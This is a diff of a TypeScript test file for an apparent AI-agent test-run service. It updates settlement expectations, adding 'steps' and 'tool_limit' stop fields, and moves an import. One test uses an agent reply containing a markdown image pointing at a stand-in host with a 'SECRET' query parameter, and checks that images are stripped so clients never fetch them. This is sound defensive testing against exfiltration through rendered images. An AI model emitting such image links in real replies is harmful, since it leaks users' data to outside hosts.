@@ -15,10 +15,10 @@ import {
 } from '../src/config/platform-funding.ts';
 import type { PlatformEnv } from '../src/config/state-backend.ts';
 import type { AgentConversationSnapshot } from '../src/slack/bounded-agent-observation.ts';
+import { withoutImages } from '../src/agents/practice-steps.ts';
 import {
   cloudflareTestRunInstancePort,
   testRunSettlement,
-  withoutImages,
   type SettledAgentSubmission,
 } from '../src/state/test-run-instance.ts';
 import type { UsageMicros } from '../src/usage/usage-display.ts';
@@ -51,21 +51,21 @@ test('a reply leaves the store with no image a client would fetch: each is its a
 
 test('an answered run stores its reply without images', () => {
   const settled = testRunSettlement(answered(' Two tickets. ![](https://evil.example/p?d=SECRET) '), 'sub_1', undefined);
-  assert.deepEqual(settled, { kind: 'answered', reply: 'Two tickets. https://evil.example/p?d=SECRET', read: [] });
+  assert.deepEqual(settled, { kind: 'answered', reply: 'Two tickets. https://evil.example/p?d=SECRET', read: [], steps: [] });
 });
 
-test('an attempt the 25-call limit ended is a failure that is not credited back; another agent failure is', () => {
+test('an attempt the 25-call limit ended is a failure that stopped at the limit and is not credited back; another agent failure is', () => {
   const ended = (error: unknown) => testRunSettlement({ outcome: 'failed', error }, 'sub_1', undefined);
   // As Flue settles it (tests/run-fees-flue.test.ts reads the real one).
   assert.deepEqual(ended({
     name: 'FlueError', type: 'operation_failed', message: `dispatch(sub_1) failed: ${TEST_TURN_ATTEMPT_ENDED_MESSAGE}`,
     meta: { operation: 'dispatch(sub_1)', reason: TEST_TURN_ATTEMPT_ENDED_MESSAGE },
-  }), { kind: 'failed', failure: 'failed', creditBack: null });
+  }), { kind: 'failed', failure: 'failed', stopped: 'tool_limit', creditBack: null });
   assert.deepEqual(ended({ message: 'The attempt failed.', cause: { message: TEST_TURN_ATTEMPT_ENDED_MESSAGE } }),
-    { kind: 'failed', failure: 'failed', creditBack: null });
+    { kind: 'failed', failure: 'failed', stopped: 'tool_limit', creditBack: null });
   // Flue's reason is matched exactly, even if its message prefix changes.
   assert.deepEqual(ended({ name: 'FlueError', message: 'Operation failed.', meta: { reason: TEST_TURN_ATTEMPT_ENDED_MESSAGE } }),
-    { kind: 'failed', failure: 'failed', creditBack: null });
+    { kind: 'failed', failure: 'failed', stopped: 'tool_limit', creditBack: null });
   assert.deepEqual(ended({ message: 'The agent threw.' }), { kind: 'failed', failure: 'failed', creditBack: 'chickpea' });
 });
 
